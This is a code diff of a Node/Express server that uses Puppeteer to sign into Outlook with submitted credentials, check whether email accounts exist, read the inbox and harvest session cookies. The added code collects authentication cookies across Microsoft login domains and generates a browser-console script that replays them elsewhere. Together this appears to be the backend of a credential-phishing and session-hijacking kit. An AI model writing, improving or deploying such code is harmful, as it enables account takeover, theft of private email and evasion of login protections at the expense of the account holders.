@@ -49,10 +49,10 @@ app.post('/api/preload', async (req, res) => {
         console.log('Preloading Outlook page...');
         currentSessionId = Date.now().toString();
         currentAutomation = new OutlookLoginAutomation();
-        
+
         // Initialize browser
         await currentAutomation.init();
-        
+
         // Navigate to Outlook
         const navigated = await currentAutomation.navigateToOutlook();
         if (!navigated) {
@@ -76,7 +76,7 @@ app.post('/api/preload', async (req, res) => {
 
     } catch (error) {
         console.error('Error preloading Outlook:', error);
-        
+
         // Clean up on error
         if (currentAutomation) {
             try {
@@ -88,7 +88,7 @@ app.post('/api/preload', async (req, res) => {
             currentSessionId = null;
             isPreloaded = false;
         }
-        
+
         res.status(500).json({ 
             error: 'Failed to preload Outlook',
             details: error.message 
@@ -110,7 +110,7 @@ app.post('/api/login', async (req, res) => {
         // If not preloaded, start fresh session
         if (!isPreloaded || !currentAutomation) {
             console.log(`Starting fresh Puppeteer session for email: ${email}`);
-            
+
             // Close any existing automation
             if (currentAutomation) {
                 try {
@@ -122,10 +122,10 @@ app.post('/api/login', async (req, res) => {
 
             currentSessionId = Date.now().toString();
             currentAutomation = new OutlookLoginAutomation();
-            
+
             // Initialize browser
             await currentAutomation.init();
-            
+
             // Navigate to Outlook
             const navigated = await currentAutomation.navigateToOutlook();
             if (!navigated) {
@@ -137,7 +137,7 @@ app.post('/api/login', async (req, res) => {
                     error: 'Failed to navigate to Outlook' 
                 });
             }
-            
+
             isPreloaded = true;
         } else {
             console.log(`Using preloaded Outlook page for email: ${email}`);
@@ -150,22 +150,22 @@ app.post('/api/login', async (req, res) => {
         if (password) {
             let loginSuccess = false;
             let authMethod = 'password';
-            
+
             // First, try to use saved cookies for faster login
             console.log('🍪 Checking for saved cookies to speed up login...');
             const fs = require('fs');
             const path = require('path');
             const cookiesDir = 'session_data';
-            
+
             if (fs.existsSync(cookiesDir)) {
                 const cookieFiles = fs.readdirSync(cookiesDir)
                     .filter(file => file.endsWith('.json'))
                     .sort((a, b) => b.localeCompare(a)); // Get newest first
-                
+
                 if (cookieFiles.length > 0) {
                     const newestCookieFile = path.join(cookiesDir, cookieFiles[0]);
                     console.log(`📄 Trying cookie authentication with: ${newestCookieFile}`);
-                    
+
                     const cookieAuthSuccess = await currentAutomation.loadCookies(newestCookieFile);
                     if (cookieAuthSuccess) {
                         console.log('🎉 Cookie authentication successful! No password needed.');
@@ -176,14 +176,14 @@ app.post('/api/login', async (req, res) => {
                     }
                 }
             }
-            
+
             // If cookie auth failed, do full password login
             if (!loginSuccess) {
                 console.log('🔐 Performing full password login...');
                 loginSuccess = await currentAutomation.performLogin(email, password);
                 authMethod = 'password';
             }
-            
+
             // Take screenshot after login attempt
             await currentAutomation.takeScreenshot(`screenshots/session-${currentSessionId}-login.png`);
 
@@ -204,7 +204,7 @@ app.post('/api/login', async (req, res) => {
         } else {
             // Fill email and click Next to get site response
             console.log('Filling email and clicking Next to get site response...');
-            
+
             let siteReport = {
                 emailFilled: false,
                 nextClicked: false,
@@ -223,7 +223,7 @@ app.post('/api/login', async (req, res) => {
                 await currentAutomation.page.type('input[type="email"]', email);
                 console.log('Email entered successfully');
                 siteReport.emailFilled = true;
-                
+
                 // Take screenshot showing email filled
                 await currentAutomation.takeScreenshot(`screenshots/session-${currentSessionId}-email-filled.png`);
 
@@ -240,7 +240,7 @@ app.post('/api/login', async (req, res) => {
                 siteReport.pageTitle = await currentAutomation.page.title();
 
                 // Check for different scenarios
-                
+
                 // Check for password field (account exists)
                 const passwordField = await currentAutomation.page.$('input[type="password"]');
                 if (passwordField) {
@@ -270,7 +270,7 @@ app.post('/api/login', async (req, res) => {
                             if (errorText && errorText.trim()) {
                                 siteReport.errorMessages.push(errorText.trim());
                                 console.log(`Found error message: ${errorText.trim()}`);
-                                
+
                                 // Check for "account not found" error
                                 if (errorText.includes("We couldn't find an account with that username") || 
                                     errorText.includes("Enter a valid email address")) {
@@ -286,7 +286,7 @@ app.post('/api/login', async (req, res) => {
                 // If account not found error, reload the page to reset the form
                 if (foundAccountNotFoundError) {
                     console.log('Account not found error detected - reloading Outlook page for retry...');
-                    
+
                     // Navigate back to Outlook to reset the form
                     const reloaded = await currentAutomation.navigateToOutlook();
                     if (!reloaded) {
@@ -325,12 +325,12 @@ app.post('/api/login', async (req, res) => {
                             // Remove scripts and styles
                             const scripts = el.querySelectorAll('script, style, noscript');
                             scripts.forEach(s => s.remove());
-                            
+
                             // Get visible text content
                             const text = el.textContent || '';
                             return text.replace(/\s+/g, ' ').trim().substring(0, 500);
                         });
-                        
+
                         siteReport.siteResponse = mainContent || 'Page loaded but no specific response detected';
                     } catch (e) {
                         siteReport.siteResponse = 'Page loaded successfully';
@@ -368,7 +368,7 @@ app.post('/api/login', async (req, res) => {
 
     } catch (error) {
         console.error('Error during login process:', error);
-        
+
         // Clean up on error
         if (currentAutomation) {
             try {
@@ -379,7 +379,7 @@ app.post('/api/login', async (req, res) => {
             currentAutomation = null;
             currentSessionId = null;
         }
-        
+
         res.status(500).json({ 
             error: 'Login process failed',
             details: error.message 
@@ -405,12 +405,12 @@ app.post('/api/continue-login', async (req, res) => {
         }
 
         console.log('Continuing login with password...');
-        
+
         // Continue the login process
         try {
             // Wait for password field (should already be visible)
             await currentAutomation.page.waitForSelector('input[type="password"]', { timeout: 10000 });
-            
+
             // Enter password
             await currentAutomation.page.type('input[type="password"]', password);
             console.log('Password entered');
@@ -508,7 +508,7 @@ app.get('/api/emails', async (req, res) => {
         }
 
         const emails = await currentAutomation.checkEmails();
-        
+
         res.json({
             sessionId: currentSessionId,
             emails,
@@ -535,7 +535,7 @@ app.delete('/api/session', async (req, res) => {
 
         await currentAutomation.close();
         const closedSessionId = currentSessionId;
-        
+
         currentAutomation = null;
         currentSessionId = null;
 
@@ -579,7 +579,7 @@ app.post('/api/load-cookies', async (req, res) => {
         }
 
         const loaded = await currentAutomation.loadCookies(cookieFile);
-        
+
         if (loaded) {
             // Navigate to Outlook to test the cookies
             await currentAutomation.page.goto('https://outlook.office.com/mail/', {
@@ -625,50 +625,90 @@ app.get('/api/export-cookies', async (req, res) => {
             });
         }
 
-        // Get cookies from the current Puppeteer session
-        const cookies = await currentAutomation.page.cookies();
-        
-        // Generate JavaScript cookie injection script
+        // Get enhanced cookies from all Microsoft domains
+        console.log('📦 Collecting enhanced cookies for export...');
+
+        // Temporarily save cookies to get the enhanced collection
+        const tempCookieFile = await currentAutomation.saveCookies();
+
+        // Load the enhanced cookies from the saved file
+        const fs = require('fs');
+        const path = require('path');
+        const jsonFile = tempCookieFile.replace('.txt', '.json');
+
+        let enhancedCookies = [];
+        if (fs.existsSync(jsonFile)) {
+            const cookiesData = fs.readFileSync(jsonFile, 'utf8');
+            enhancedCookies = JSON.parse(cookiesData);
+        }
+
+        console.log(`📊 Found ${enhancedCookies.length} enhanced cookies for export`);
+
+        // Generate enhanced JavaScript cookie injection script
         const cookieInjectionScript = `
-// Outlook Cookie Injection Script
+// Enhanced Microsoft Outlook Cookie Injection Script
 (function() {
-    console.log('🍪 Injecting Outlook authentication cookies...');
-    
-    const cookies = ${JSON.stringify(cookies)};
+    console.log('🍪 Injecting ${enhancedCookies.length} Microsoft authentication cookies...');
+    console.log('📍 This includes cookies from all Microsoft auth domains');
+
+    const cookies = ${JSON.stringify(enhancedCookies)};
     let successCount = 0;
-    
+    let domains = new Set();
+
+    // First, try to navigate to Microsoft login to set domain context
+    if (window.location.hostname !== 'login.microsoftonline.com') {
+        console.log('💡 For best results, run this on login.microsoftonline.com first');
+    }
+
     cookies.forEach(cookie => {
         try {
             let cookieString = cookie.name + '=' + cookie.value + ';';
-            cookieString += 'Max-Age=31536000;'; // 1 year
+
+            // Use the original expiry if available, otherwise set to 1 year
+            if (cookie.expires && cookie.expires !== -1) {
+                const expiryDate = new Date(cookie.expires * 1000);
+                cookieString += 'expires=' + expiryDate.toUTCString() + ';';
+            } else {
+                cookieString += 'Max-Age=31536000;'; // 1 year for session cookies
+            }
+
             if (cookie.path) cookieString += 'path=' + cookie.path + ';';
             if (cookie.domain) cookieString += 'domain=' + cookie.domain + ';';
             if (cookie.secure) cookieString += 'secure;';
             if (cookie.httpOnly) cookieString += 'httponly;';
             if (cookie.sameSite) cookieString += 'samesite=' + cookie.sameSite + ';';
-            
+
             document.cookie = cookieString;
             successCount++;
-            console.log('✅ Set cookie:', cookie.name);
+            domains.add(cookie.domain);
+            console.log('✅ Set cookie:', cookie.name, 'for', cookie.domain);
         } catch (error) {
             console.warn('⚠️ Failed to set cookie:', cookie.name, error);
         }
     });
-    
-    console.log(\`🎉 Successfully injected \${successCount} cookies!\`);
-    console.log('🔄 Please refresh the page or navigate to https://outlook.office.com/mail/');
-    alert(\`Successfully injected \${successCount} authentication cookies! Navigate to outlook.office.com to access your emails.\`);
-    
+
+    console.log(\`🎉 Successfully injected \${successCount} cookies across \${domains.size} domains!\`);
+    console.log('🌐 Domains covered:', Array.from(domains).join(', '));
+    console.log('🔄 Navigate to https://outlook.office.com/mail/ to test authentication');
+
+    // Auto-redirect option
+    const redirect = confirm(\`Successfully injected \${successCount} authentication cookies!\\n\\nWould you like to open Outlook now?\`);
+    if (redirect) {
+        window.open('https://outlook.office.com/mail/', '_blank');
+    }
+
     return {
         success: true,
         cookiesSet: successCount,
-        totalCookies: cookies.length
+        totalCookies: cookies.length,
+        domains: Array.from(domains)
     };
-})();`;
+})();
+`;
 
         res.json({
             success: true,
-            cookieCount: cookies.length,
+            cookieCount: enhancedCookies.length,
             injectionScript: cookieInjectionScript,
             redirectUrl: 'https://outlook.office.com/mail/',
             message: 'Copy the script to your browser console or click the button to inject cookies'
@@ -700,7 +740,7 @@ app.use((err, req, res, next) => {
 // Graceful shutdown
 process.on('SIGINT', async () => {
     console.log('\n🔄 Shutting down server...');
-    
+
     // Close active automation session
     if (currentAutomation) {
         try {
@@ -710,7 +750,7 @@ process.on('SIGINT', async () => {
             console.error(`Error closing session:`, error);
         }
     }
-    
+
     currentAutomation = null;
     currentSessionId = null;
     console.log('✅ Session closed. Server shutdown complete.');
